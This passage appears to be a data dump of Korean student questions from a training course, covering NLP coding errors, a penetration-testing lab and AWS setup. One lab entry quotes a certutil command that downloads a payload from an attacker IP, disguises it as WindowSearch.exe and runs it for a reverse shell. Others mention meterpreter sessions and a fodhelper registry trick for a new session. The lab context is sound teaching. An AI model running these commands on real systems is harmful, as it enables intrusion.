뽑아서 Count frequency and sorting를 하든 mapping string from integer 를 하든 CountVectorizer를 하든 셋 중 하나만 하면 되는걸까요?\\n\\n세 가지를 다 해야한다면 그 이유가 무엇인가요??',\n","       'join을 하는 중 사진과 같이 오류가 나 문의 드립니다.\\n\\n찾아보니 join은 문자만 가능하다고 하는데,\\ndf.text.explode()로 text 컬럼을 추출해보면 사진과 같이 인덱스(행 번호)가 같이 출력되어 이런 문제가 생긴 게 아닐까 생각합니다.\\n\\n근데 text 컬럼만 추출했는데 인덱스가 같이 출력되는 상황이다보니 인덱스를 어떻게 지워야 할지 모르겠습니다.\\n\\n이게 원인이 아니라면 어떤 점을 고쳐야 join 함수를 원활하게 쓸 수 있을까요?',\n","       \"def morphs_text(text):\\n    from konlpy.tag import Kkma\\n    from konlpy.utils import pprint\\n\\n    kma = Kkma()\\n    return kma.morphs(text)\\n\\ndata['text'] = data['text'].apply(morphs_text)\\ndata['text'] = data['text'].apply(nouns_text)\\n\\n이러한 식으로 적용해서 돌리면  끝나지 않고 계속 실행되어서 질문드립니다\\n이렇게 하는게 맞는 방식일까요?\",\n","       \"기본적으로 keras의 texts_to_sequences를 통한 정수화를 진행하였는데\\ncountvectorizer와 TfidfVectorizer를 fit_transform 할 때 자꾸 오류가 뜹니다.\\n'list' object has no attribute 'lower'\\n데이터 형식을 texts_to_sequences을 이용할 때와 다르게 넣어줘야 하나요??\\n\\n\",\n","       '3-1 N-grams Vectorize에서 ValueError: max_df corresponds to \u0026lt; documents than min_df 라는 오류가 떠서 min_df =1로 고쳤더니 ValueError: Found input variables with inconsistent numbers of samples: [1, 14070] 에러가 뜹니다 해결방법을 알려주세요\\n\\n\\n\\n',\n","       '2-1.텍스트 길이 분포\\nplt.figure(figsize=(10,5))\\nspam.text.str.len().plot.hist(title=\"max string length : \" + str(max(spam.text.str.len())))\\nplt.show()\\n\\n실행하면 NameError: name \\'spam\\' is not defined 오류가 발생합니다.',\n","       '데이터를 train과 test로 나누긴 했는데, 벡터화를 어떻게 해야 할지 모르겠습니다.\\n감사합니다.',\n","       '문제를 해결하는 과정에서 N-grams Vectorize 과정에서 문제가 발생했습니다.\\n\\ncount_vect = CountVectorizer()\\nX_train_counts = count_vect.fit_transform(x_train)\\n\\ntf_transformer = TfidfTransformer(use_idf=False).fit(X_train_counts)\\nX_train_tf = tf_transformer.transform(X_train_counts)\\n\\nX_train_tf.shape\\n이런 식으로 코드를 구성해서 진행했더니 (1, 1)의 결과값이 도출되었습니다.\\n train과 val 데이터 셋은 x_train, x_val, y_train, y_val = train_test_split(x, y, test_size = 0.2)\\n으로 나누었습니다. 어떤곳에서 문제가 생긴 것인지 모르겠습니다.',\n","       '강의 영상 다시보기에 키보드 방향 키로 10초 전후 이동이 가능했으면 좋겠습니다!\\n마우스 클릭으로 전후 이동이 가능하긴 하지만\\n대략 8시간 길이의 영상이다보니 원하는 위치로 이동하기가 힘듭니다 ㅠㅠ..\\n혹시 방향 키로 이동할 수 있도록 구현이 가능한 부분일까요?..',\n","       \"data exploration 과정 중 2-2 형태소/명사 추출 과정에서 문제가 없었는데 추출한 명사들(nouns data)이 similar words부터 'float' object has no attribute 'isalpha'가 계속 발생합니다 이에 대한 해결 방법이 있을까요\",\n","       '어제 5시쯤되서 그런지 원격이 진행되지 않아 진행을 못했습니다.\\n\\n오류는 y should be a 1d array, got an array of shape (2, 2) instead.뜨는 오류 였습니다.',\n","       '안녕하세요!\\n\\n다름이 아니라, 오늘의 정보 보안 실습 자료 다운 링크 외에도,\\n이전 강의 자료들이 업로드 되어있는 에이블 구글 드라이브 링크를 다시 문의드려도 될까요? \\n\\n답변 감사합니다:)',\n","       '언어지능 딥러닝 과정에서 형태소를 나눈뒤에 n-gram을 실시하는게 맞나요?',\n","       '교육장 세팅으로 인해 캐글 전까지의 내용을 듣지못해\\n테스트 데이터 다운로드 받는 방법을 다시 설명해주시면 감사하겠습니다',\n","       '하지만 에러코드가 Found input variables with inconsistent numbers of samples: [16071, 32142]가 뜨면서 진행이 안되는데 뭐가 원인인가요...도대체... 이걸해야 이번 미니프로젝트를 수월하게 진행이 될꺼같은데...',\n","       'x_train = vectorizer.fit_transform(train_texts)\\n\\n실행도중에 \\n\\nmax_df corresponds to \u0026lt; documents than min_df\\n이런 에러 문구가 뜨면 어디를 봐야할까요? ㅜㅜ',\n","       'cv = CountVectorizer()\\ntrain_ft = cv.fit_transform(x_train)\\ntest_t = cv.transform(x_test)\\n\\n----------------------------------------\\n\\n# N-gram\\ncvN = CountVectorizer(ngram_range=(2,2)).fit(x_train)\\n\\n이렇게 해서 저장은 어떻게 해야하나요?\\n감사합니다.',\n","       'for s in x_train.text:\\n    x_train_noun = mecab.nouns(s)\\n    x_train_nouns.append(x_train_noun)\\n\\ncount_vect = CountVectorizer()\\nX_train_counts = count_vect.fit_transform(x_train_nouns)\\n\\ntf_transformer = TfidfTransformer(use_idf=True).fit(X_train_counts)\\nX_train_tf = tf_transformer.transform(X_train_counts)\\n\\nX_train_tf.shape\\n\\n이런식으로 코드를 만들었습니다. \\n수정 해봐도 N_gram_Vector를 진행시킬수 없어서 문의 드립니다.',\n","       '캐글 때문에 답변 못해주실 지 모르지만 이부분에 대해서 계속 헤매고 있어서 질문드립니다 ㅠㅠ\\n사진과 같이 코드를 작성했고 함수는 참고자료에 있는 것을 사용했습니다.\\nValueError: Found input variables with inconsistent numbers of samples: [432730, 16071]\\n이러한 오류는 어떻게 해결해야할까요 ㅠㅠ',\n","       '그 전의 질문은 해결했습니다 감사합니다!\\nspam.csv로 만든 모델(best_model.h5)을 가져와서 spam_test_spam.csv에 어떻게 저장하나요?\\npd.read로 spam_test_spam을 불러오고 모델을 불러와야 하나요?',\n","       '안녕하세요!\\n오늘 오전에는 AIDU에서 gpu 사용해서 모델 학습했었는데, 갑자기 학습 시간이 너무 느려져서 봤더니 리소스에 CPU만 있습니다..ㅠㅠ\\n\\n혹시 오늘 미니프로젝트시 GPU사용하면 안되는걸까요..?\\n',\n","       '오전 수업때 캐글에서 csv 파일 제출 방법을 알려주신것 같은데 제가 잠깐 외출을 해서 수업을 놓쳤습니다ㅠㅠ \\n죄송하지만 한번 다시 알려주실 수 있으실까요? 저번 프로젝트때도, 제가 캐글에서 제출을 못했습니다ㅠ 말씀해주시면 감사드리겠습니다',\n","       '안녕하세요! 필요한 학습도구가 아래와 같다고 말씀해주셨는데, 2번 밖에 보이지 않아서 1번과 3번은 어떻게 다운받는 것인지 여쭙고자 문의 드립니다. \\n\\n1. Attacker.ova 2. PFsense.ova 3. Windows10.ova \\n\\n구글 드라이브 내에 있는 PFsense.ova를 다운 받고,  사진 속 공유해주신 폴더 속 파일들을 다운 받으면 되는 게 맞는 지 질문드려도 될까요?',\n","       '현재 진행중에 test 데이터 전처리 과정 후 predict 시키려고 하는데 자꾸 에러가 나서요.\\n혹시 kaggle 제출을 못하고 ppt 제출만 할 수 있을까요?',\n","       '강의자료의 링크로 들어가면 나오는 곳에는 PFsense.ova 파일 밖에 없는데 나머지 파일은 어디서 다운로드 받아야 하나요?',\n","       '기존에 cmd창에 ipconfig 했을때 ip가 안 떠서 원격으로 진행해서 \\n네트워크랑 호스트 네트워크를 추가해 주셨거든요.\\n전부 삭제하고 설정했는데 지금은 ip가 나오긴 하는데 \\n기존ip주소가 이더넷으로 뜨는데\\n사진처럼 나와도 상관없는지 궁금합니다.',\n","       '안녕하세요 혹시 지금 줌 강의장 정상적으로 살아있는 상태일까요? 검은 화면에 아무 소리도 안들려서 컴퓨터를 재부팅했는데도 똑같아서 문의드립니다ㅠㅠ\\n\\n@@@@@지금 화면 들어왔습니다...!! 답변 안해주셔도 될 것 같아요@@@@@@@',\n","       'PFsense 네트워크의 어댑터 1에서 NAT로 두고, 어댑터 2와 3에 각각 attacker와 window10해야되나요???\\n\\nattacker 네트워크의 어댑터 1에 호스트 전용 어댑터 #2\\nwindow10 네트워크의 어댑터 1에 호스트 전용 어댑터 #3\\n으로 했습니다.\\n맞을까요?\\n',\n","       \"가상 머신 PFsense의 세션을 열 수 없습니다.\\n\\nImplementation of the USB 2.0 controller not found!\\n\\nBecause the USB 2.0 controller state is part of the saved VM state, the VM cannot be started. To fix this problem, either install the 'Oracle VM VirtualBox Extension Pack' or disable USB 2.0 support in the VM settings.\\n\\nNote! This error could also mean that an incompatible version of the 'Oracle VM VirtualBox Extension Pack' is installed (VERR_NOT_FOUND).\\n\\n결과 코드: E_FAIL (0x80004005)\\n구성 요소: ConsoleWrap\\n인터페이스: IConsole {872da645-4a9b-1727-bee2-5585105b9eed}\\n\\n\\n\",\n","       '이더넷 두개라서 삭제 부탁드려요 ! \\narp -a 해도 지금 물리적 주소? f로만 뜹니다! \\n도와주세요..',\n","       '192.168.0.2 작성하고 접속하면 캠처 화면 처럼 됩니다.ㅠㅠ',\n","       '안녕하세요 튜터님,\\n실습 중 윈도우 가상환경에서 192.168.0.24를 102.168.0.2로 변경했는데,\\n이후 arp 확인했을때 192.168.0.2 주소가 뜨지 않습니다.\\n\\n제가 이전 과정에서 어떤 부분을 놓쳤는지, 확인해주시면 감사하겠습니다!',\n","       'chrome에 localhost 오류 뜨는 부분은 어떻게 해결할까요?\\n ',\n","       '게이트웨이 주소를 192.168.0.2로 변경해도\\narp -a에서 맥 주소가 등록되지 않는 현상에 대해서 질문을 남겼었는데\\n답변이 강사님께 설명요청 하신다고 하셨었습니다.\\n\\n그런데 곧 전에 강사님께서는 저와 같은 상황인 분들은\\n1:1 질문남기라고 말씀하셔서\\n다시 질문 남깁니다...!',\n","       'chrome에192.168.0.2 주소 입력하고 엔터 누르면\\n흰창이 뜹니다\\n재설정해볼까요? ',\n","       '고생하십니다.\\n\\n강사님이 말씀하시기로 이메일로만 ppt를 제출만 하면 된다고 하셨는데\\n4시 조금 넘은 시간에 이메일로 제출했는데 문제 없을까요?',\n","       '원격으로 한번만 부탁 드려요.. 네트워크도 설정 똑같고 USB도 체크 풀었습니다..',\n","       '방화벽 로그인 과정이 어떻게 되나요?',\n","       '실습에서 해당 코드를 입력하고 다음과 같이 떴습니다:\\n\\nRestarting networking (via systemctl): networking.serviceJob for networking\\n.service failed because the control process exited with error code.\\nSee \"systemctl status networking.service\" and \"journalctl -xe\" for details.\\n failed!\\n\\n\"with error code\"라길래 이전 2개 코드도 확인해봤더니 교재와 같아서 어디서 잘못됐는지 모르겠습니다. 도와주세요!',\n","       '가상 머신 PFsense의 세션을 열 수 없습니다 오류가 발생합니다\\n실습절차서 9p까진 설정완료했는데 pfsense 실행이 되지 않네요',\n","       \"sed -i ‘s/gateway 31.44.7.254/gateway 31.44.7.2/g’ /etc/network/interfaces\\n명령어 입력 후 \\nsed: -e expression #1, char 42:unknown option to 's' 라는 오류가 뜹니다\\n\",\n","       '\\nsed -i ‘s/gateway 31.44.7.254/gateway 31.44.7.2/g’ /etc/network/interfaces /etc/init.d/networking restart\\n\\n이거는 어디에다가 해야 했던 걸까요..?\\n',\n","       '아까 실습에서 arp - a를 치면 incomplete만 뜨고 게이트웨이 값도 254 에서 2로 변경이 되지 않습니다 ㅠㅠ',\n","       '강사님이 실습으로만 끝내고 절대 외부에서 사용하지 말라고 신신당부하셨는데...\\n지금 가상머신으로 실습하는 내용이  (똑같이 따라하면) 실제로도 외부를 공격하는 악성코드를 만들어내고 사이버 공격을 가할 수 있는 것인가요?\\n',\n","       '마지막 exploit -j -z를    exploit -i -z로 했는데 처음부터 다시 해야할까요??',\n","       'url 주소 맞게 입력한 것 같은데,,, 어디서 틀린걸까요??',\n","       \"➢ certutil -urlcache -f http://31.44.7.100/test.exe c:\\\\users\\\\public\\\\WindowSearch.exe\\n➢ cd c:\\\\users\\\\public\\\\\\n➢ dir\\n➢ WindowSearch.exe\\n여기까지 윈도우 cmd창에 입력했더니 'WindowSearch.exe' is not recognized라는 오류가 뜨면서 Attacker 터미널에서도 sessions 결과가 없다고 나옵니다. 어디서부터 잘못된 걸까요...?\",\n","       '재접속 계속 하는데도 메인 강의장이 안들어가집니다,,,,,,,',\n","       'meterpreter 명령창에서 shell 명령 입력 시 windows 명령창으로 이동하는 것을 확인하고 \\n\\ntxt 파일을 생성하려 exit 으로 빠져 나오고 다시 sessions 으로 돌아오려 하니 오류가 뜹니다 \\n\\n원격 부탁드립니다',\n","       'windows에서 certutil로 다운받은 WindowSearch.exe를 실행하면\\n칼리리눅스 쪽에 Command shell session 1 opened.... 라고 안내문구가 나올 것 입니다.\\n\\n해당 위 안내문구에서 1이 sessions id 이며 해당 id로 접속하셔야 합니다.\\n만약 해결이 안되시면 재 문의 부탁드립니다.\\n\\n원격으로 도와드리도록 하겠습니다.\\n감사합니다.\\n\\n칼리리눅스에 아무것도 안뜹니다. 어떻게 해야 되나요??\\n그리고 원격으로 하고 싶어도 노트북이 느려서 인터넷 창도 안 열리고 있어서 어려울꺼 같습니다.ㅠㅠ',\n","       '안녕하세요~\\n실습 2-3 에서\\nreverse connection 어떻게 하는건가요??\\n윈도우10에서 WindowSearch.exe 실행 후에\\n어택커에서 sessions -i 1 명령어 했는데 진행이 안됩니다~',\n","       '실습 2-6에서 레지스트리 키 정보를 등록한 후, fodhelper.exe를 실행하면 신규세션이 맺어져야 하는데 나타나질 않습니다.',\n","       \"안녕하세요! \\n종료 후 다시 튜터님께서 말씀해주신대로 sed - i 와 's 사이 공백을 추가했는데\\n\\n여전히 3 번째 명령어 입력 시 네트워크 연결이 안 된다고 나와서, 혹시 또 다른 문제가 있는 건지 여쭤봐도 될까요?ㅠㅠ\\n\\n오른쪽 상단에 네트워크가 연결되지 않는다고 나오는 것이 문제가 안되는 건지 문의드리고 싶습니다!\",\n","       '어제 1:1 질문 통해서 attacker 화면 조정하는데 문제가 있어서 도움 요청하였는데, 원격지원해주신다고 한 답변을 오늘 아침에 확인하였습니다. 혹시 지금이라도 도움 주실 수 있을까요? ',\n","       '리스크가 생기는 건 아는데,\\n그걸 왜 주권의 문제라고 하는지가 궁금합니다..!',\n","       'VM을 항상 유지 안하고 요청에 따라 켜는게 \\n구글 코랩에서 GPU 할당 해주는 그런 느낌이라 이해하는게 괜찮나요? ',\n","       '행방향으로 합쳐야 하나요? 아니면 열방향으로 합쳐야 하나요?',\n","       'A_DISTANCE : 실 주행 거리\\nET : 실제 주행 시간\\nETA : 원내비 예측 주행 시간\\n\\n위 변수의 단위가 궁금합니다.',\n","       'sns.boxplot() 은 했는데 이상치 개수 확인을 어떻게 해야 할지 잘 모르겠습니다..ㅠ',\n","       '당연히도 fit했습니다 ㅠㅠ 이전에 질문드린곳에 사진 올려드렸는데 제대로 fit과 predict모두 했습니다 ㅠㅠ',\n","       '강의장 채팅창에 운영자 공지 채팅으로 강의교안과 실습교재를 재다운로드 해달라는 걸 봤습니다.\\n최초 올라온 강의교안과 실습교재가 수정되었나요?',\n","       \"현재 데이터 전처리 파일에서 단서 5번 빼고 전부 정답을 맞춘 상태입니다.\\n그런데 암만 해봐도 값이 109117로 나오는데 답이 아니라고 나와서 그러는데 제가 잘못하고 있는건가요?\\n\\nout = df_total['level1_pnu'].isin(['-', '충청북도', '강원도', '충청남도'])\\ndf_total1 = df_total[~out]\\n\\n행 제거 코드는 위와 같이 했습니다\\n\",\n","       '강사님의 데이터로 머신러닝, 딥러닝 모델을 만들고 5번파일에서 강사님의 eval 데이터로 mean과 std를 구하였는데 다르다고 합니다. 무엇이 잘못되었을까요? ㅠㅠ\\n\\n사진 첨부했습니다!',\n","       \"dummy = 'WEEKDAY', 'HOUR', 'level1_pnu', 'level2_pnu', 'DAY'\\npd.get_dummies(df_total , prefix = dummy, drop_first=False)\\n\\n이렇게 실행 했는데 커널이 계속 죽습니다 문제가 있을까요?\",\n","       \"random forest 모델 구축 부분을 하고 있는데\\n\\nfrom sklearn.ensemble import RandomForestClassifier\\nfrom sklearn.metrics import r2_score\\n\\nrandomF = RandomForestClassifier(n_estimators=100,max_depth=5,min_samples_split=30,min_samples_leaf=15,random_state=42)\\nx_train = x_train.astype('int')\\ny_train = y_train.astype('int')\\nx_test = x_test.astype('int')\\ny_test = y_test.astype('int')\\nrandomF.fit(x_train, y_train)\\ny_pred = line.predict(x_test)\\nr2 = r2_score(y_test, y_pred)\\nr2\\n\\n위와 같이 코드를 입력했는데\\nr2 값이 -2.513792305782017 와 같이 나와\\n단서 3에 -2.51379로 입력했습니다.\\n그런데 답이 아니라고 나와서 그런데 혹시 어디가 문제일까요...?\",\n","       \"The column label 'RID' is not unique.\\n라는 오류가 떴습니다.\",\n","       'vpc를 생성했는데 규칙그룹을 로드 실패했다고 나옵니다 \\n해결하려면 어떻게 해야하나요?',\n","       \"더미 변수로 만든후에 원본을 삭제하라는 말이 원본을 더미변수로 대체하라는 말인줄 알았는데 다른가요?\\n\\n제가 사용한 코드입니다.\\n\\n\\ndf_total['WEEKDAY']=pd.get_dummies(df_total['WEEKDAY'],prefix='dummy', drop_first=False)\\ndf_total['HOUR']=pd.get_dummies(df_total['HOUR'],prefix='dummy', drop_first=False)\\ndf_total['level1_pnu']=pd.get_dummies(df_total['level1_pnu'],prefix='dummy', drop_first=False)\\ndf_total['level2_pnu']=pd.get_dummies(df_total['level2_pnu'],prefix='dummy', drop_first=False)\\n\\n어떻게 틀렸는지와 어떻게 고쳐야 하는지 알려주시면 감사하겠습니다.\",\n","       'y_pred = randomF.predict(x_test)\\n로 바꾸어 계산했을때\\nr2값이 -0.48613886391883576\\n와 같이 나와서 -0.48614로 했을때 \\n정답이라고 하지 않네요.... ',\n","       \"rf = RandomForestRegressor(n_estimators=100,max_depth=5,min_samples_split=30,min_samples_leaf=15,random_state=42)\\npred2 = rf.fit(train_x,train_y)\\nr2_score(test_y, pred2)\\n\\n해당 방식으로 입력시\\nExpected sequence or array-like, got \\n에러가 발생하는데 regressor가 아닌 classfilter로  진행하면\\nUnknown label type: 'continuous' 가 뜨기떄문에 학습 자체가 안됩니다.\\n\\n어디가 오류인지 알 수  있을 까요?\",\n","       '서브넷 생성 어떻게 들어가나요...ㅠㅜ', '이런식으로 가중치를 로드하고, 모델을 저장하는 건가요?',\n","       \"RandomForestClassifier 학습진행 시 ValueError: Unknown label type: 'continuous'\\n오류가 뜹니다..ㅠ \",\n","       \"조건문에서 4. 'scale_data'를 (0과 1 사이)MinMaxScaler로 스케일링 하고 각각 'feature' 변수로 DataFrame으로 변경 후 저장해주세요. 라는 뜻이 스케일링 한 후에 DataFrame으로 저장하라는 뜻이죠?\",\n","       '셀프테스테에 나왔던 문제인데요\\nUDP의 경우 소켓이 없기 때문에 ip를 통해서 데이터를 전송하지 않나요?',\n","       'aws 비밀번호 구성과 계정 id가 어떻게 되었는지 기억이 나지 않아 로그인을 못하고 있습니다.',\n","       'ValueError: feature_names mismatch\\n\\n단서 문제 모두 풀었는데 해당 에러가 뜹니다 혹시 놓친 부분이 있을지 문의드립니다.',\n","       'XGBoost를 기준으로 Panda전략에 따라 모델 최적화를 진행해달라고 하셨는데 이 때는 라이브러리를 사용하지 않고 제가 파라미터를 직접 변경하는 방식이 맞을까요?',\n","       '전용옵션 쓰면 서버도 지정하고 아이피도 고정되나요?',\n","       '모듈 실행 시, feature_names mismatch 에러가 발생합니다.\\nmodel 폴더, add_data 폴더 에도 4_model.pkl과 csv 가 있는 상황입니다.',\n","       '7번 문제의 단서 2번인데요, model 폴더에 DeeplearningModel_2.h5라고 똑같이 저장이 됐는데 왜 정답이라고 뜨지 않을까요?ㅠㅠ 여러 번 다시 저장해봤지만 안 되네요....ㅠ',\n","       '서울 리전이 아닌 7반 미국서부 캘리포니아로 진행중입니다.\\n퍼블릭 서브넷 가용영역 설정 중 교안에서는 각각 아시아 태평양 a,c로 되어있는데 \\n해당 서브넷을 각각 미국 서부 캘리포니아 a,b로 설정해도 괜찮은 건가요?\\n또 IPv4 CIDR 블록도 그냥 교안대로 입력해도되나요?',\n","       '8반 미국 오레곤으로 바꾸고 만들었어야했는데 그냥 서울에서 만들어버렸어요 ... \\n이거 서울에서 만든 인스턴스 어떻게... 지우나요? ㅜㅜ',\n","       '안녕하세요!\\n실습 36페이지 복사한 명령어로 인스턴스 접속하는 부분 하는중인데\\n사진과 같은 Connection timed out 이러한 에러로 접속이 안되는데\\n어떤 문제 일까요?\\n\\n감사합니다!',\n","       '가상머신에서 인스턴스 설정 다 하고 시작했는데 새로고침해도 안뜹니다 ㅠㅠ 다시 해야할까요?',\n","       'cmd창으로 웹서버 구축 명령 내리고 있는데 Connection error가 발생합니다. 어떻게 하는 것이 좋을까요?',\n","       '항상 고생하십니당 웹서버 구축단계에 있는데 경로를 Downloads를 하고 복사한 명령어로 접속을 하는데 접속자체가 안되고 있습니다 경로에서 파일을 찾을 수 없어서 연결이 안된다고 뜹니다. 혹시 몰라서 다운로드에서 키파일을 확인했는데 키파일은 있는데 연결이 되지않아서 문의 올립니다',\n","       '인스턴스 생성 후 cmd창에 ssh접속을 시도했지만 Connection timed out  에러가 납니당..\\n구글링으로 해결해보려 했는데 잘 안돼서 문의 남깁니당ㅠㅠ 흑.. ',\n","       '안녕하세요! 실습 해결요청 드립니다.\\n\\nThis is taking longer than expected. The delay may be caused by high CPU usage in your environment, or your T2 or T3 instance is running out of burstable CPU capacity credits, or there are VPC configuration issues. \\n\\n라는 팝업창이 뜨고 커넥팅만 계속 돌아가면서 진행이 되지 않습니다 ㅠㅠ\\n이럴땐 어떻게 해결해야 할까요?\\n어디서 잘못된지 감도 안잡혀서 이렇게 요청드립니다..감사합니다!!\\n',\n","       'Cannot find a valid baseurl for repo: amzn2-core/2/x86_64라고 뜨는데 원격으로 도와주실 수 있을까요? ',\n","       '웹서버 하는데 안 돼요',\n","       '54페이지에서 SSH 클라이언트 탭 하단에서 복사하라고 지시한,\\nssh -i \"d021107-mykey.pem\" ec2-user@ec2-13-58-146-62.us-east-2.compute.amazonaws.com // 명령을 입력하였을 때\\nssh: connect to host ec2-13-58-146-62.us-east-2.compute.amazonaws.com port 22: Connection timed out // 과 같은 오류 메세지가 발생합니다.\\n\\n어떤 문제로 발생하는 오류인지 몰라 문의 남깁니다! 고맙습니다.',\n","       '현재 22번 포트로 접근하는 SSH 접속이 거부되고 있습니다.\\n현재 인스턴스의 보안그룹 설정에서 인바운드 규칙을 잘못 작성하여 보안 그룹이 액세스를 허용하지 않는 것 같습니다. \\n보안 그룹 설정 - 인바운드 규칙에 SSH 접속 소스 부분을 다시 한번 확인해보시기 바랍니다.\\n\\n이렇게 답변 받았는데 보안 그룹 설정 다시 하고 싶으면 어떻게 해야 하나요?\\n인스턴스 편집 어떻게 들어가는지 알려주세요',\n","       '아까 제가 모르고 파일을 클릭하면서 mykey 메모장형식으로 바꿔버리게 되었는데 이런경우 어떻게 해야 되나요??? 작동테스트 10번을 못하고 있어서 질문 드립니다ㅠㅠ',\n","       '마이키를 새로 받아도 텍스트 파일로 저장이 되어 실행이 안되는데 이럴때 다른 방법은 없는건가요??',\n","       '안녕하세요\\n이전 질문에서 ec2인스턴트 접속 후에 해야 한다는 답변을 받았었는데요\\n접속이 이게 맞는지 여쭤보고 싶어 질문드립니다.\\n계속 실행 중으로 떠있었어서요!\\n감사합니다',\n","       '0.0.0.0/0로 변경 후에도 안됩니당ㅜㅜㅜ 사용자 정의로  노트북 ip인 1.227.5.183/32 해도 안되구요\\n\\n--------------------------------\\n어제 개방형 와이파이 환경에서 실습하였는데 그게 문제 였던것 같습니다!! 결론은 해결되었습니다 ㅎㅎ\\n',\n","       '라우팅 편집 버튼 클릭하여 NAT 게이트웨이 경로를 추가하려 하는데 아무것도 뜨지 않습니당..\\n위에 NAT Gateway도 제대로 생성하였습니다..ㅠ',\n","       'ssh명령어가 안돼서 실습진행을 못했습니다\\n오후 실습을 위해 1대1문의 남깁니다.\\n아이디는d023135입니다.',\n","       '튜터님들 고생이 많으십니다.\\n\\nAWS에서 어제 실습을 다 했던걸로 기억하는데 혹시 몰라 확인 확인 요청드립니다.\\n\\nd025177 입니다!',\n","       '캐시라는 개념에 대해서 아직 잘 모르겠습니다',\n","       '교안 252쪽에 아키텍처를 보면 서버하나에 캐시도 하나씩 있는데 \\n서버마다 캐시가 하나씩은 무조건 있어야 하는 건가요?',\n","       'cloud9에서 업데이트 수행에서 요류가 뜹니다. \\nCould not retrieve mirrorlist https://amazonlinux-2-repos-ap-northeast-1.s3.dualstack.ap-northeast-1.amazonaws.com/2/core/latest/x86_64/mirror.list error was\\n12: Timeout on https://amazonlinux-2-repos-ap-northeast-1.s3.dualstack.ap-northeast-1.amazonaws.com/2/core/latest/x86_64/mirror.list: (28, \\'Failed to connect to amazonlinux-2-repos-ap-northeast-1.s3.dualstack.ap-northeast-1.amazonaws.com port 443 after 2702 ms: Connection timed out\\')\\n\\n\\n One of the configured repositories failed (Unknown),\\n and yum doesn\\'t have enough cached data to continue. At this point the only\\n safe thing yum can do is fail. There are a few ways to work \"fix\" this:\\n\\n     1. Contact the upstream for the repository and get them to fix the problem.\\n\\n     2. Reconfigure the baseurl/etc. for the repository, to point to a working\\n        upstream. This is most often useful if you are using a newer\\n        distribution release than is supported by the repository (and the\\n        packages for the previous distribution release still work).\\n\\n     3. Run the command with the repository temporarily disabled\\n            yum --disablerepo= ...\\n\\n     4. Disable the repository permanently, so yum won\\'t use it by default. Yum\\n        will then just ignore the repository until you permanently enable it\\n        again or use --enablerepo for temporary usage:\\n\\n            yum-config-manager --disable \\n        or\\n            subscription-manager repos --disable=\\n\\n     5. Configure the failing repository to be skipped, if it is unavailable.\\n        Note that yum will try to contact the repo. when it runs most commands,\\n        so will have to try and fail each time (and thus. yum will be be much\\n        slower). If it is a very temporary problem though, this is often a nice\\n        compromise:\\n\\n            yum-config-manager --save --setopt=.skip_if_unavailable=true\\n\\nCannot find a valid baseurl for repo: amzn2-core/2/x86_64',\n","       'webserver을 다시 만들어서,\\n클라우드 실행이 됐는데, 그 후에 답변을 확인했습니다~\\n\\n보안그룹을 다시 만들어서 해야할까요?',\n","       '7성구를 얻는 과정에서\\n\\n# 단서를 모두 모았다면 드래곤볼을 찾아봅시다! 아래 소스코드를 실행해 주세요.\\nimport module\\n\\nmodule.seventhModule(ID)\\n에 해당하는 과정에서 \\nValueError: Layer model expects 2 input(s), but it received 1 input tensors. Inputs received: []\\n를 오류가 출력되었습니다.\\n모델에서 concate를 쓰기위해 입력을 둘로 분할하면서 오류가 발생한것 같습니다. 혹시 모델의 입력을 둘로 나눈 상태에서는 7성구를 얻을 수 없는 건 가요?',\n","       '마지막 버킷 웹사이트 엔드포인트 주소를 복사 붙여넣기 하였는데\\n\\n403 Forbidden\\nCode: AccessDenied\\nMessage: Access Denied\\nRequestId: 6VCTXTD70YJCFF2Q\\nHostId: 58g3jmaV65luUTS4RweOE70ewsSb3INfjHnR53Yth5vbbH6W/5io0+XOVG70QKjNUvdcr7b9OvQ=\\n\\n다음과 같은 오류가 뜹니다 어디서 설정이 잘못된건가요?',\n","       'ppt 89p \\n6. RDS 접속하기 위해 아래 명령어의 엔드포인트 부분을 여러분의 RDS 엔드포인트로 수정합니다.\\n부분 명령어 복사 붙여넣기 했는데 실행이 안됩니다.',\n","       '원격부탁드립니다 튜터님;;',\n","       '53p private 인스턴스 연결 시도했을때 \\n인스턴스에 퍼블릭 IPv4 주소가 없음\\n이라고 뜨면서 연결이 안되는데 왜 그런걸까요 ? ',\n","       'default security group을 삭제하고 드롭다운 메뉴에서 userxx-myALB-SG을 선택 합니다. 하고 되어 있는데 12번 보안그룹생성 클릭하니깐 바로 왼쪽 화면처럼 되어 있습니다. 어디로 들어가서 해야되는건지 알려주실 수 있을까요??',\n","       '정책을 설정하는데 오류가 발생합니다\\n원격으로 지원을 받을 수 있을까요',\n","       '보안그룹 생성 버튼까지 눌렀는데 이 부분 어디서 찾아야 할까요??',\n","       '강사님께서 3번 5번 4번 순서로 하라고 하셔서 마지막 4번을 하고 있는데 RDS인스턴스 생성 과정에서 DB서브넷 그룹이 뜨지 않아 문의 드립니다.',\n","       '다시 접속해서 로드밸런서 생성을 눌러봐도\\n퍼블릭 서브넷이 하나뿐이라 진행할 수가 없습니다...\\n\\n어디서 부터 실습을 이어나가면 되는 걸까요?',\n","       '말씀주신 대로 새로운 터미널에 접속하여 해보도 mysql [(none)]\u0026gt; 이 안뜹니다!!\\n',\n","       '안녕하세요!\\n\\n교안 89페이지에 6번에 안내 대로 제 RDS 엔드포인트로 수정했는데요.\\n\\nCloud9에서 오류가 발생하는데 어떻게 해결할 수 있을지 문의드립니다.\\n\\n감사합니다!',\n","       '115쪽 DNS 이름 복사해 ip변경되는지 확인이 안되는데 우선 넘어가도 될까요???-',\n","       '안녕하세요.\\n클라우드 실습5관련 문의드립니다.\\n\\n116P ASG-Web Server 한개 강제 종료 후 새로운 인스턴스 생성되는 것을 확인하기 위해,\\n본인 id(d021087)로 인스턴트 검색하였으나 새로운 인스턴스가 생성된 것을 확인할 수 없었습니다.\\n\\n새로운 인스턴스가 생성되었는지 확인하려면 어떻게 검색해야 할지 문의드립니다.\\n\\n감사합니다.',\n","       \"mysql 명령어를 입력하면 다음과 같은 에러가 뜨는데 어떻게 해야 할까요?\\n\\nERROR 2002 (HY000): Can't connect to local MySQL server through socket '/var/lib/mysql/mysql.sock' (2)\",\n","       '안녕하세요.\\n85페이지 가용영역에 northeast가 아니라 southeast만 뜨는데 \\nap-southeast-2c로 선택하면 될까요?\\n\\n감사합니다. ',\n","       \"설정을 미쳐 보지 못하고 넘겨버려서 C9에서 명령어 실행이 안 됩니다 (p86)\\n\\n\u0026gt;\u0026gt; Unknown database 'staffinfo'\\n\\nRDS\u0026gt; 데이터베이스\u0026gt; DB인스턴스 수정에서 해보려 했지만 안됐습니다, 해결 방법이 있는지  문의드립니다.\",\n","       '7번을 실행하고 싶은데 